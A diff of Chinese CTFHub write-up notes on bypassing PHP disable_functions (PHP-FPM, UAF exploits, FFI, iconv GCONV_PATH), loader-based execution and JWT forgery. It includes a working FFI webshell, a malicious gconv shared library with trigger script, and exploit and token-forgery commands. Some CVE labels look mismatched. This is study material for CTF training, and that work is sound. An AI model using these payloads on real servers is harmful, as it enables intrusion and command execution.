+    *   能够设置上传的 Shell 脚本具有可执行权限 (通常通过 WebShell)。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    1.  通过 WebShell 上传 `.htaccess` 文件 (内容如上)。
+    2.  通过 WebShell 上传 `shell.wors` 文件 (内容如上)。
+    3.  通过 WebShell 给 `shell.wors` 添加执行权限: `chmod +x shell.wors`。
+    4.  在浏览器中访问 `http://target.com/path/to/shell.wors`。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![Apache Mod CGI 1](/ctfhub/images/web7.png)
+    (蚁剑连接，可查看 `phpinfo` 确认 Apache、mod_cgi、AllowOverride 等信息)
+    ![Apache Mod CGI 2](/ctfhub/images/web8.png)
+    (上传 `.htaccess` 和 `shell.wors`，并执行 `chmod +x shell.wors`)
+    (访问 `shell.wors` 文件获取 Flag - 截图缺失)
+
+### 5. PHP-FPM
+
+*   **概述 (Overview):** PHP-FPM (FastCGI Process Manager) 是 PHP FastCGI 的一种实现，用于处理 Web 服务器（如 Nginx, Apache）转发过来的 PHP 请求。如果 PHP-FPM 监听的端口（默认为 `127.0.0.1:9000`）意外暴露在公网，或者攻击者可以通过 SSRF 或已有的 WebShell 访问到该端口，就可以直接构造 FastCGI 协议数据包与 PHP-FPM 通信，通过控制特定的 FastCGI 环境变量来执行任意 PHP 代码，从而绕过 `disable_functions`。
+*   **工作原理 (Working Principle):**
+    1.  **FastCGI 协议:** Web 服务器与 PHP-FPM 之间通过 FastCGI 协议通信。该协议基于 TCP 或 Unix Socket，传输的是结构化的数据包 (Record)，包含 Header 和 Body。
+    2.  **环境变量:** 请求信息（如 URL、请求方法、服务器变量等）被编码为 FastCGI 的环境变量（类型 4 的 Record）发送给 PHP-FPM。关键环境变量包括 `SCRIPT_FILENAME` (指定要执行的 PHP 文件) 和 `DOCUMENT_ROOT`。
+    3.  **未授权访问利用:** 如果能直接与 FPM 端口通信，攻击者可以构造恶意的 FastCGI 请求。
+    4.  **代码执行:** 通过设置特定的 FastCGI 环境变量 `PHP_VALUE` 或 `PHP_ADMIN_VALUE`，可以动态修改 PHP 配置项。关键配置项包括：
+        *   `auto_prepend_file = php://input`: 让 PHP 在执行 `SCRIPT_FILENAME` 指定的文件之前，先包含并执行 HTTP 请求 Body 中的内容。
+        *   `allow_url_include = On`: 允许包含远程文件和 `php://` 伪协议。
+    5.  **构造请求:** 攻击者构造一个 FastCGI 请求，其中：
+        *   `SCRIPT_FILENAME` 指向一个目标服务器上**已存在**的 PHP 文件（因为 `security.limit_extensions` 通常限制只能执行 `.php` 文件，且文件必须存在）。
+        *   设置 `PHP_VALUE` 或 `PHP_ADMIN_VALUE` 来开启 `allow_url_include` 和设置 `auto_prepend_file = php://input`。
+        *   将要执行的 PHP 代码（例如 `<?php system('id'); ?>`）放在 FastCGI 请求的 Body 部分（通常是类型为 `FCGI_STDIN` 的 Record）。
+    6.  **执行流程:** PHP-FPM 收到请求 -> 解析环境变量 -> 设置 PHP 配置 -> 准备执行 `SCRIPT_FILENAME` -> 执行 `auto_prepend_file` (即 `php://input`) -> 执行了 Body 中的 PHP 代码。
+*   **利用条件 (Exploitation Conditions):**
+    *   能够访问 PHP-FPM 监听的端口（TCP 或 Unix Socket）。通常是 `127.0.0.1:9000`，若配置错误或存在 SSRF 则可能从外部访问。
+    *   知道目标服务器上至少一个存在的 PHP 文件的绝对路径（如 `/var/www/html/index.php`）。
+    *   (通常需要) PHP 版本支持通过 `PHP_VALUE`/`PHP_ADMIN_VALUE` 修改 `auto_prepend_file` 和 `allow_url_include` (大多数版本可以)。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    *   **工具:** 通常使用专门的工具（如 `fpm.py`, `fcgi_exp.go`）来构造和发送 FastCGI 请求。
+    *   **命令示例 (使用 fpm.py):**
+        ```bash
+        # 假设目标 FPM 在 127.0.0.1:9000，已知 /var/www/html/index.php 存在
+        python fpm.py 127.0.0.1 9000 /var/www/html/index.php -c "<?php system('id'); exit(); ?>"
+        ```
+        工具会构造包含上述环境变量和 Body 的 FastCGI 请求发送给 FPM。
+*   **CTFHUB 示例 (利用已有 Webshell 和插件):**
+    *   **原理:** 某些 WebShell 管理工具（如蚁剑）的绕过 `disable_functions` 插件利用了 PHP-FPM。它们通过已有的 WebShell 上传一个恶意的 PHP 扩展 (`.so`)，然后利用 PHP-FPM 加载这个扩展，启动一个新的、没有 `disable_functions` 限制的 PHP 进程（或修改当前 FPM worker 配置），并将后续的命令执行请求通过代理转发到这个“干净”的 PHP 环境执行。
+    *   **条件:** 需要 WebShell，目标使用 PHP-FPM，存在可写目录上传 `.so`。
+    ![PHP-FPM 1](/ctfhub/images/web9.png)
+    (蚁剑连接)
+    ![PHP-FPM 2](/ctfhub/images/web10.png)
+    (使用蚁剑的 PHP-FPM/FastCGI 绕过插件)
+    ![PHP-FPM 3](/ctfhub/images/web11.png)
+    (成功执行命令获取 Flag)
+
+### 6. GC UAF (PHP 7.0-7.3 垃圾回收器漏洞 - CVE-2016-5771 / Bug #72530)
+
+*   **概述 (Overview):** 此漏洞利用 PHP 垃圾收集器 (Garbage Collector, GC) 处理特定循环引用对象时的逻辑缺陷，导致 Use-After-Free (UAF) 内存破坏。通过精心构造 PHP 对象和触发 GC，可以控制已释放的内存，最终修改函数指针以执行任意代码（如 `system()`）。
+*   **工作原理 (Working Principle - 简化):**
+    1.  **UAF 概念:** Use-After-Free 是指当一块内存被释放后，程序仍然保留着指向该内存的指针（悬垂指针），并在后续操作中通过该指针访问或修改已被释放的内存区域。此时该内存可能已被重新分配给其他数据，导致数据损坏、程序崩溃或被攻击者利用来控制执行流程。
+    2.  **漏洞触发:** 通过 `unserialize()` 创建包含特定循环引用的对象结构。
+    3.  **GC 介入:** 调用 `gc_collect_cycles()` 触发垃圾回收。由于 bug，GC 错误地释放了仍在使用的对象内存。
+    4.  **内存占位与伪造:** 利用后续的操作（如创建新对象或字符串）来占据刚刚被释放的内存区域，并写入精心构造的数据（如伪造的对象结构、伪造的函数指针）。
+    5.  **劫持执行流:** 当程序后续通过悬垂指针访问伪造的对象或调用其方法时，会跳转到攻击者指定的地址（如 `system()` 函数的地址），并以可控的参数执行。
+*   **利用条件 (Exploitation Conditions):**
+    *   PHP 版本: 7.0.x, 7.1.x, 7.2.x, 7.3.x (具体受影响范围需查证 CVE 和 Bug 报告)。
+    *   Linux 操作系统 (Exploit 通常依赖 Linux 的内存布局和函数地址)。
+    *   通常需要知道一些内存地址信息（Exploit 会尝试自动泄露）。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    *   使用现成的 PoC exploit 代码（如笔记中提供的 `mm0r1` 的 PoC）。
+    *   修改 PoC 中的命令 (`pwn("tac /flag");`) 为需要执行的命令。
+    *   上传该 PHP 文件到目标服务器。
+    *   通过 Web 访问该 PHP 文件触发漏洞利用。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![GC UAF 1](/ctfhub/images/web12.png)
+    (蚁剑连接)
+    ![GC UAF 2](/ctfhub/images/web13.png)
+    (上传修改好命令的 `gc_uaf_exploit.php`)
+    ![GC UAF 3](/ctfhub/images/web14.png)
+    (访问 exploit 文件获取 Flag)
+*   **注意事项 (Considerations):** UAF 漏洞利用通常对特定 PHP 版本和环境敏感，可能不稳定。
+
+### 7. Json Serialization UAF (PHP 7.1-7.3 JSON 序列化漏洞 - CVE-2019-11041 / Bug #77843)
+
+*   **概述 (Overview):** 此漏洞存在于 PHP 的 JSON 序列化程序处理实现了 `JsonSerializable` 接口的对象时的逻辑缺陷，同样可导致 Use-After-Free (UAF)。利用方式与 GC UAF 类似，通过触发漏洞、内存占位和伪造数据，最终劫持执行流调用 `system()`。
+*   **工作原理 (Working Principle - 简化):** 与 GC UAF 类似，但触发点是 `json_encode()` 函数处理包含特定结构（涉及实现了 `JsonSerializable` 接口的对象和引用）的数据时。
+*   **利用条件 (Exploitation Conditions):**
+    *   PHP 版本:
+        *   7.1.x (all versions)
+        *   7.2.x < 7.2.19
+        *   7.3.x < 7.3.6
+    *   Linux 操作系统。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    *   使用现成的 PoC exploit 代码 (如笔记中提供的)。
+    *   修改 PoC 中的命令 (`$cmd = "tac /flag";`)。
+    *   上传 PHP 文件到目标服务器。
+    *   访问该 PHP 文件触发利用。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![Json Serialization UAF 1](/ctfhub/images/web15.png)
+    (蚁剑连接)
+    ![Json Serialization UAF 2](/ctfhub/images/web16.png)
+    (上传修改好命令的 `json_uaf_exploit.php`)
+    ![Json Serialization UAF 3](/ctfhub/images/web17.png)
+    (访问 exploit 文件获取 Flag)
+*   **注意事项 (Considerations):** 同 UAF 漏洞，可能不稳定，依赖特定环境。
+
+### 8. Backtrace UAF (PHP 7.0-7.4 debug_backtrace 漏洞 - CVE-2019-11043 / Bug #76047)
+
+*   **概述 (Overview):** PHP 的 `debug_backtrace()` 或 `Exception->getTrace()` 函数在处理某些涉及对象析构的场景时，可能返回一个指向已被销毁变量的引用，从而导致 Use-After-Free (UAF)。利用原理与其他 UAF 类似。
+*   **工作原理 (Working Principle - 简化):** 通过构造特定的类和函数调用顺序，使得在 `__destruct` 方法内调用 `debug_backtrace()` 时，其返回的参数数组中包含了对刚刚被销毁的变量的引用。后续操作这个引用即可触发 UAF。
+*   **利用条件 (Exploitation Conditions):**
+    *   PHP 版本:
+        *   7.0.x (all versions)
+        *   7.1.x (all versions)
+        *   7.2.x (all versions)
+        *   7.3.x < 7.3.15
+        *   7.4.x < 7.4.3
+    *   Linux 操作系统。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    *   使用现成的 PoC exploit 代码 (如笔记中提供的)。
+    *   修改 PoC 中的命令 (`pwn("tac /flag");`)。
+    *   上传 PHP 文件。
+    *   访问该 PHP 文件。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![Backtrace UAF 1](/ctfhub/images/web18.png)
+    (蚁剑连接)
+    ![Backtrace UAF 2](/ctfhub/images/web19.png)
+    (上传修改好命令的 `backtrace_uaf_exploit.php`)
+    ![Backtrace UAF 3](/ctfhub/images/web20.png)
+    (访问 exploit 文件获取 Flag)
+*   **注意事项 (Considerations):** 同 UAF 漏洞。
+
+### 9. FFI (Foreign Function Interface) 扩展 (PHP >= 7.4)
+
+*   **概述 (Overview):** FFI 是 PHP 7.4 版本引入的一个官方扩展，允许 PHP 代码直接调用 C 语言编写的函数和使用 C 语言的数据结构。如果 FFI 扩展被启用 (`ffi.enable=true`)，并且 `FFI` 类未被禁用，攻击者可以直接通过 FFI 调用 C 标准库中的 `system()` 函数来执行命令。
+*   **工作原理 (Working Principle):**
+    1.  **声明接口:** 使用 `FFI::cdef()` 方法声明要调用的 C 函数的原型（例如 `int system(const char *command);`）。PHP FFI 会在运行时查找并链接到包含该函数的库（通常是 libc）。
+    2.  **调用函数:** 通过 FFI 对象直接调用声明的 C 函数，就像调用 PHP 函数一样 (`$ffi->system("command");`)。
+*   **利用条件 (Exploitation Conditions):**
+    *   PHP 版本 >= 7.4。
+    *   PHP 编译时包含 FFI 扩展。
+    *   `php.ini` 中 `ffi.enable` 设置为 `On` (注意，CLI SAPI 下默认为 `On`，其他 SAPI 如 FPM 默认为 `preload`，需要预加载才能用)。
+    *   `FFI` 类及其方法未在 `disable_classes` 或 `disable_functions` 中被禁用。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    ```php
+    <?php
+    // 检查 FFI 是否可用
+    if (extension_loaded('ffi') && ini_get('ffi.enable') === '1') { // 检查 ffi.enable=true
+        try {
+            // 声明要调用的 system 函数
+            $ffi = FFI::cdef("int system(const char *command);"); 
+            
+            // 获取命令 (例如从 GET 参数)
+            $command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id'; 
+
+            // (可选) 将输出重定向到文件，以便读取
+            $output_file = "/var/www/html/ffi_output.txt"; // 确保可写
+            $command_with_redir = $command . " > " . $output_file . " 2>&1";
+
+            // 通过 FFI 调用 system 函数
+            $ffi->system($command_with_redir); 
+
+            // 读取并显示结果
+            if (file_exists($output_file)) {
+                echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
+                // @unlink($output_file); // 清理
+            } else {
+                echo "Output file not found or command failed.";
+            }
+
+        } catch (FFI\Exception $e) {
+            echo "FFI Error: " . $e->getMessage();
         }
     } else {
-        show_source(__FILE__);
+        echo "FFI extension is not loaded or not enabled (ffi.enable must be On).";
     }
-}
-?>
-打开题目可以看到有一段代码审计,大意是根据JWT的role来决定是否输出flag。同时$algs = array_merge(array($header->alg, $alg));
-这段代码允许头部指定加密算法,默认算法是RS256,如果头部指定其他算法,服务器也会接受。因此可以伪造JWT
-python jwt_tool.py -I -hc "alg:HS256" -pc "username:admin,role:admin" -k publickey.pem
-![修改签名算法 1](/ctfhub/images/jwt10.png)
-重发包获得flag
-![修改签名算法 2](/ctfhub/images/jwt11.png)
+    ?>
+    ```
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![FFI扩展 1](/ctfhub/images/web21.png)
+    (蚁剑连接)
+    ![FFI扩展 2](/ctfhub/images/web22.png)
+    (上传上述 FFI exploit PHP 文件)
+    ![FFI扩展 3](/ctfhub/images/web23.png)
+    (访问 exploit 文件，通过 GET 参数传递命令，如 `?cmd=tac /flag`)
+
+### 10. iconv (GCONV_PATH 环境变量 - Linux)
+
+*   **概述 (Overview):** PHP 的 `iconv` 系列函数（用于字符集转换）在底层通常调用 glibc 库的 `iconv` 实现。glibc 的 `iconv_open()` 函数可以通过 `GCONV_PATH` 环境变量来加载用户自定义的字符集转换模块 (`.so` 文件)。攻击者可以利用这一点，通过 `putenv()` 设置 `GCONV_PATH` 指向包含恶意配置 (`gconv-modules`) 和恶意共享库 (`.so`) 的目录，然后调用 `iconv()` 函数（或其他触发 iconv 调用的函数/过滤器）来加载并执行恶意 `.so` 文件中的代码。
+*   **工作原理 (Working Principle):**
+    1.  **`gconv-modules` 文件:** 这是一个配置文件，列出了字符集名称及其对应的转换模块 (`.so` 文件) 和函数。攻击者创建一个自定义的 `gconv-modules` 文件，指定一个自定义的字符集名称（如 `PWN`)，并将其映射到自己编译的恶意 `.so` 文件中的 `gconv_init` 和 `gconv` 函数。
+        ```
+        # gconv-modules file content (e.g., save as /tmp/gconv-modules)
+        # Define a custom conversion from PWN charset to UTF-8
+        # module  FROM_CHARSET  TO_CHARSET  MODULE_PATH  COST
+        module  PWN//           UTF-8//     ./pwn      1 
+        # (MODULE_PATH is relative to GCONV_PATH directory, here ./pwn means /tmp/pwn.so)
+        ```
+    2.  **恶意 `.so` 文件 (`pwn.so`):** 编写一个 C 文件 (`pwn.c`)，包含 `gconv_init()` 或 `gconv()` 函数。在这些函数（通常是 `gconv_init`，因为它在加载时执行）中加入执行系统命令的代码。
+        ```c
+        // pwn.c
+        #include <stdio.h>
+        #include <stdlib.h>
+
+        // This function is called when the module is loaded
+        void gconv_init() {
+            // Execute the command (e.g., get command from environment variable)
+            const char* cmd = getenv("_iconv_cmd");
+            if (cmd != NULL) {
+                system(cmd);
+            } else {
+                system("echo 'iconv bypass success, _iconv_cmd not set' > /tmp/iconv_fallback.txt");
+            }
+            // Exit cleanly to avoid crashing the parent PHP process (optional but good practice)
+            exit(0); 
+        }
+
+        // This function is called for the actual conversion (can also be used)
+        void gconv() {
+            // Could also put payload here, gconv_init is usually preferred
+            exit(0); 
+        }
+        ```
+        编译: `gcc -shared -fPIC -o pwn.so pwn.c`
+    3.  **设置 `GCONV_PATH`:** 使用 `putenv()` 设置 `GCONV_PATH` 环境变量，使其指向存放 `gconv-modules` 文件的目录 (例如 `putenv("GCONV_PATH=/tmp");`)。
+    4.  **设置命令环境变量:** 使用 `putenv()` 设置一个包含要执行命令的环境变量 (例如 `putenv("_iconv_cmd=id > /tmp/iconv_out.txt");`)。
+    5.  **触发 `iconv` 调用:** 调用 PHP 的 `iconv()` 函数，使用自定义的字符集名称作为转换源或目标 (例如 `iconv("PWN", "UTF-8", "test");`)。这会使 glibc 加载 `/tmp/pwn.so` 并执行 `gconv_init()` 中的代码。
+*   **利用条件 (Exploitation Conditions):**
+    *   Linux 操作系统。
+    *   `putenv()` 函数可用。
+    *   PHP 安装并启用了 `iconv` 扩展。
+    *   存在可写的目录 (如 `/tmp`) 用于上传 `gconv-modules` 和 `pwn.so` 文件。
+    *   `iconv()` 函数本身未被禁用 (或者可以使用其他触发 iconv 的方式)。
+*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
+    1.  上传编译好的 `pwn.so` 到 `/tmp/pwn.so`。
+    2.  上传 `gconv-modules` 文件 (内容如上) 到 `/tmp/gconv-modules`。
+    3.  编写并上传触发 PHP 脚本 `iconv_trigger.php`:
+        ```php
+        <?php
+        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
+        $output_file = '/tmp/iconv_out.txt'; // Ensure /tmp is writable
+        $cmd_with_redir = $cmd . ' > ' . $output_file . ' 2>&1';
+        
+        putenv("GCONV_PATH=/tmp"); // Point to directory with gconv-modules
+        putenv("_iconv_cmd=" . $cmd_with_redir); // Pass command via env var
+
+        // Trigger iconv using the custom charset "PWN"
+        if (function_exists('iconv')) {
+            @iconv("PWN", "UTF-8", "test"); // The string "test" is arbitrary
+        } else {
+            die("iconv function is disabled.");
+        }
+
+        // Read output
+        sleep(1);
+        if (file_exists($output_file)) {
+            echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
+            // @unlink($output_file);
+            // It's tricky to cleanup gconv-modules and pwn.so from within the triggered payload easily
+        } else {
+            echo "Output file not found or command failed.";
+        }
+        ?>
+        ```
+    4.  访问 `iconv_trigger.php?cmd=ls -al /`。
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![iconv 1](/ctfhub/images/iconv1.png)
+    (上传 `gconv-modules` 到 `/tmp`)
+    ![iconv 2](/ctfhub/images/iconv2.png)
+    (上传编译好的 `pwn.so` 到 `/tmp`)
+    ![iconv 3](/ctfhub/images/iconv3.png)
+    (上传 `iconv_trigger.php`)
+    ![iconv 4](/ctfhub/images/iconv4.png)
+    (访问 `iconv_trigger.php?cmd=tac /flag` 获取 Flag)
+
+*   **Bypass iconv 1 (使用 `iconv_strlen`):**
+    *   **原理:** 如果 `iconv` 被禁，但 `iconv_strlen` 未被禁，`iconv_strlen` 同样会调用底层的 `iconv_open`，可以用来触发漏洞。
+    ![bypass iconv 1 1](/ctfhub/images/iconv5.png) (phpinfo 显示 `iconv` 被禁，`iconv_strlen` 可用)
+    *   **修改 Payload:** 将 `iconv_trigger.php` 中的 `iconv("PWN", "UTF-8", "test");` 替换为 `@iconv_strlen("test", "PWN");`。
+    ![bypass iconv 1 2](/ctfhub/images/iconv6.png) (修改后的触发代码)
+
+*   **Bypass iconv 2 (使用 Stream Filter `convert.iconv.*`):**
+    *   **原理:** 如果 `iconv` 和 `iconv_strlen` 都被禁，PHP 的流过滤器 `convert.iconv.*`（例如用于 `file_get_contents` 或 `fopen`）在处理数据时也会调用底层的 `iconv` 实现，同样可以触发 `GCONV_PATH` 机制。
+    ![bypass iconv 2 1](/ctfhub/images/iconv7.png) (phpinfo 显示 `iconv` 相关函数被大量禁用)
+    *   **修改 Payload:** 将 `iconv_trigger.php` 中的触发部分替换为使用流过滤器，例如：
+        ```php
+        // Trigger using file_get_contents with convert.iconv filter
+        // php://filter/read=convert.iconv.PWN.UTF-8/resource=php://temp
+        // Creates a temporary stream, reads from it using the filter, triggering iconv
+        if (function_exists('file_get_contents')) {
+             @file_get_contents('php://filter/read=convert.iconv.PWN.UTF-8/resource=php://temp');
+        } else {
+             die("file_get_contents function is disabled.");
+        } 
+        ```
+    ![bypass iconv 2 2](/ctfhub/images/iconv8.png) (修改后的触发代码)
+
+---
+
+# Linux 特殊执行技巧
+
+## 1. 动态加载器执行无执行权限文件 (Dynamic Loader Execution Bypass)
+
+*   **概述 (Overview):** Linux 系统在执行 ELF (Executable and Linkable Format) 文件时，通常会依赖一个动态链接器/加载器 (如 `/lib64/ld-linux-x86-64.so.2` 用于 64 位系统) 来加载程序及其依赖的共享库。这个动态加载器本身是一个可执行文件。我们可以直接运行动态加载器，并将目标 ELF 文件作为参数传递给它，以此来执行目标 ELF 文件，即使该文件本身没有设置执行权限 (`x`)。
+*   **识别特征 / 使用场景 (Identification / Use Cases):**
+    *   在 CTF 或渗透测试中，发现一个包含关键信息（如 flag 读取逻辑）的 ELF 可执行文件，但该文件只有读取权限 (`r`)，没有执行权限 (`x`)。
+    *   需要运行一个程序，但无法通过 `chmod +x` 修改其权限。
+*   **工作原理 (Working Principle):**
+    1.  **正常执行流程:** 当用户尝试执行一个 ELF 文件 (如 `./program`) 时，Shell 调用 `execve()` 系统调用。内核检查文件的执行权限位。如果权限不足，`execve()` 失败。如果权限足够，内核会读取 ELF 文件的头部，找到其指定的“解释器”（通常就是动态加载器的路径），然后加载并执行这个动态加载器，并将目标程序路径作为参数传递给它。
+    2.  **动态加载器工作:** 动态加载器被内核执行后，它负责读取目标程序（作为参数传递给它的那个文件）的 ELF 头，解析依赖关系，加载所需的共享库 (`.so` 文件) 到内存，进行符号重定位，最后跳转到目标程序的入口点开始执行。**关键在于**，动态加载器完成这些操作只需要对目标 ELF 文件有**读取权限**即可。
+    3.  **绕过执行:** 通过直接运行动态加载器 (`/lib64/ld-linux-x86-64.so.2 ./program`)，我们实际上是在执行动态加载器这个**有执行权限**的程序。目标 ELF 文件 (`./program`) 只是作为参数传递给它。因此，内核的 `execve()` 权限检查是对动态加载器进行的（通常允许），而不是对目标 ELF 文件。动态加载器随后只需要读取目标文件就能加载并运行它，从而绕过了目标文件本身缺少执行权限的限制。
+    *   **相关命令:**
+        *   `readelf -e <file>` 或 `readelf -l <file>`: 查看 ELF 头信息，可以找到 `Requesting program interpreter`。
+        *   `ldd <file>`: 查看程序依赖的动态库。
+*   **利用步骤 / 示例 (Exploitation Steps / Example):**
+    1.  **识别目标文件和加载器:** 找到目标 ELF 文件（例如 `readflag`）和系统的动态加载器路径（通常是 `/lib64/ld-linux-x86-64.so.2` 或 `/lib/ld-linux.so.2`）。
+    2.  **执行命令:** 在 Shell 中运行：
+        ```bash
+        /lib64/ld-linux-x86-64.so.2 ./readflag
+        ```
+        (将 `./readflag` 替换为实际的目标文件路径)
+*   **CTFHUB 示例 (CTFHUB Example):**
+    ![动态加载器 1](/ctfhub/images/linux1.png)
+    (WebShell 中看到 `readflag` 文件权限为 `644`，没有执行权限)
+    ![动态加载器 2](/ctfhub/images/linux2.png)
+    (通过直接调用 `/lib64/ld-linux-x86-64.so.2 ./readflag` 成功执行并获取 Flag)
+*   **注意事项 (Considerations):**
+    *   动态加载器的路径可能因系统架构 (32/64 位) 和发行版而异。
+    *   此方法只绕过文件系统执行权限检查，如果程序内部有其他权限检查（如检查 UID），则那些检查仍然会生效。
+    *   目标文件必须是动态链接的 ELF 文件；静态链接的文件不依赖外部加载器。
+
+---
+
+# JSON Web Token (JWT) 安全问题
+
+## 概述 (Overview)
+
+JSON Web Token (JWT) 是一种基于 JSON 的开放标准 (RFC 7519)，用于在网络应用环境间安全地传递声明（claims）。它被设计为紧凑且自包含，特别适用于分布式系统的单点登录 (SSO) 和 API 认证场景。JWT 使得服务器无需在后端存储 Session 状态，因为所有必要的用户信息和权限都包含在 Token 本身，并通过签名保证其完整性和认证性。
+
+## JWT 结构详解 (JWT Structure Details)
+
+一个 JWT 通常由三部分组成，通过点 (`.`) 分隔：`Header.Payload.Signature`。
+
+*   **Header (头部):**
+    *   描述 JWT 元数据的 JSON 对象，通常包含签名算法 (`alg`) 和 Token 类型 (`typ`, 通常是 "JWT")。
+    *   **示例 (解码后):**
+        ```json
+        {
+          "alg": "HS256", 
+          "typ": "JWT"
+        }
+        ```
+    *   此部分进行 Base64Url 编码后构成 JWT 的第一部分。
+
+*   **Payload (负载):**
+    *   包含实际需要传递的声明 (claims) 的 JSON 对象。声明是关于实体（通常是用户）和其他数据的陈述。
+    *   **标准声明 (Registered Claims):** JWT 规范预定义了一些可选的标准字段：
+        *   `iss` (Issuer): 签发者。
+        *   `sub` (Subject): 主题 (通常是用户 ID)。
+        *   `aud` (Audience): 接收者。
+        *   `exp` (Expiration Time): 过期时间戳。
+        *   `nbf` (Not Before): 生效时间戳。
+        *   `iat` (Issued At): 签发时间戳。
+        *   `jti` (JWT ID): 唯一标识符。
+    *   **私有声明 (Private Claims):** 可以在此部分添加自定义字段，用于传递应用程序特定的信息（如用户角色、权限等）。
+    *   **示例 (解码后):**
+        ```json
+        {
+          "sub": "1234567890",
+          "name": "CTFHub",
+          "role": "admin", 
+          "iat": 1516239022
+        }
+        ```
+    *   **重要:** Payload **默认只进行 Base64Url 编码，并未加密**。任何持有 Token 的人都可以解码并读取其内容。**切勿在 Payload 中存放敏感信息** (如密码)。
+    *   此部分进行 Base64Url 编码后构成 JWT 的第二部分。
+
+*   **Signature (签名):**
+    *   用于验证 Token 的发送者身份并确保消息在传输过程中未被篡改。
+    *   **生成过程:**
+        1.  取 Base64Url 编码后的 Header 和 Payload，用点 (`.`) 连接起来 (`encodedHeader + "." + encodedPayload`)。
+        2.  使用 Header 中指定的签名算法 (`alg`) 和一个密钥 (对于对称算法如 HS256 是一个共享密钥 `secret`；对于非对称算法如 RS256 是发送方的私钥) 对连接后的字符串进行签名。
+        *   **HS256 示例:** `HMACSHA256(encodedHeader + "." + encodedPayload, secret)`
+        *   **RS256 示例:** `RSASSA-PKCS1-v1_5-SIGN(SHA256(encodedHeader + "." + encodedPayload), privateKey)`
+    *   此签名进行 Base64Url 编码后构成 JWT 的第三部分。
+
+## 常见安全问题与利用 (Common Security Issues & Exploitation)
+
+### 1. 敏感信息泄露 (Sensitive Data Exposure)
+
+*   **原理 (Principle):** 如上所述，JWT 的 Payload 部分默认仅使用 Base64Url 编码，并非加密。如果开发者不慎将敏感信息（如用户内部 ID、权限详情、甚至密码相关信息）放入 Payload，这些信息对于任何能获取到 Token 的人都是可见的。
+*   **利用 (Exploitation):**
+    1.  获取 JWT Token (例如从 Cookie、Authorization Header、URL 参数或 Local Storage)。
+    2.  将 Token 按点 (`.`) 分割成三部分。
+    3.  取第二部分 (Payload)，进行 Base64Url 解码即可读取其中的 JSON 数据。
+    4.  查找是否有敏感信息。
+*   **示例 (CTFHUB Example):**
+    ![敏感信息泄露 1](/ctfhub/images/jwt1.png)
+    (抓包获取 Cookie 中的 Token)
+    ![敏感信息泄露 2](/ctfhub/images/jwt2.png)
+    (解码 Payload 部分，发现敏感信息，可能是 Flag 或用于后续步骤)
+
+### 2. 签名未验证 / 算法置空 (Signature Not Verified / Algorithm `None`)
+
+*   **原理 (Principle):** JWT 标准定义了一个特殊的签名算法值 `"none"`，表示该 Token 不使用签名。一些 JWT 库如果配置不当或存在漏洞，在验证 Token 时，如果 Header 中的 `alg` 字段被设置为 `"none"`，可能会完全跳过签名验证步骤，直接接受 Payload 中的内容。
+*   **利用 (Exploitation):**
+    1.  获取一个有效的 JWT Token。
+    2.  解码 Header 部分，将其中的 `alg` 字段值修改为 `"none"` (注意大小写敏感性，通常是 `"none"` 或 `"None"`)。
+    3.  (可选) 解码 Payload 部分，修改其中的声明（例如将用户角色从 `"guest"` 改为 `"admin"`）。
+    4.  重新对修改后的 Header 和 Payload 进行 Base64Url 编码。
+    5.  将编码后的 Header 和 Payload 用点 (`.`) 连接起来，**并将第三部分 (Signature) 删除或置为空字符串** (即 `encodedHeader.encodedPayload.` 或 `encodedHeader.encodedPayload`)。
+    6.  使用这个伪造的 Token 替换原始 Token 发送给服务器。
+*   **示例 (CTFHUB Example):**
+    ![无签名 1](/ctfhub/images/jwt3.png)
+    (抓包获取原始 Token)
+    ![无签名 2](/ctfhub/images/jwt4.png)
+    (解码 Header 改 `alg` 为 `none`，解码 Payload 改 `role` 为 `admin`，重新编码并移除签名部分)
+    ![无签名 3](/ctfhub/images/jwt5.png)
+    (重放修改后的 Token，获得 Admin 权限或 Flag)
+
+### 3. 弱密钥爆破 (Weak Secret Brute-force - HS256)
+
+*   **原理 (Principle):** 当 JWT 使用对称加密算法（如 `HS256`, `HS384`, `HS512`）时，签名和验证都依赖于同一个共享密钥 (`secret`)。如果服务器使用的这个密钥非常简单或容易猜测（例如 "secret", "password", "123456"，或者存在于常用字典中），攻击者可以通过暴力破解或字典攻击的方式猜解出密钥。
+*   **利用 (Exploitation):**
+    1.  获取一个使用对称算法 (如 Header 中 `alg` 为 `HS256`) 签名的 JWT Token。
+    2.  使用 JWT 破解工具（如 `jwt-cracker`, `hashcat` 的 JWT 模式, `jwt_tool` 的爆破功能）和字典文件尝试爆破密钥。
+    3.  **命令示例 (jwt-cracker):** `jwt-cracker <token> -a HS256 -d <dictionary_file>`
+    4.  一旦破解出密钥，攻击者就可以使用该密钥任意伪造 Token：修改 Payload（例如提升权限），然后用找到的密钥重新计算签名。
+*   **示例 (CTFHUB Example):**
+    ![弱密钥 1](/ctfhub/images/jwt6.png)
+    (抓包获取 HS256 Token)
+    ![弱密钥 2](/ctfhub/images/jwt7.png)
+    (使用 `jwt-cracker` 和字典爆破出密钥)
+    ![弱密钥 3](/ctfhub/images/jwt8.png)
+    (使用找到的密钥和 `jwt_tool` 或在线工具，修改 Payload 中 `role` 为 `admin` 并重新生成签名，构造完整 Token)
+    ![弱密钥 4](/ctfhub/images/jwt9.png)
+    (重放伪造的 Token 获取 Flag)
+
+### 4. 签名算法篡改 (Algorithm Confusion / Substitution Attack - RS256 to HS256)
+
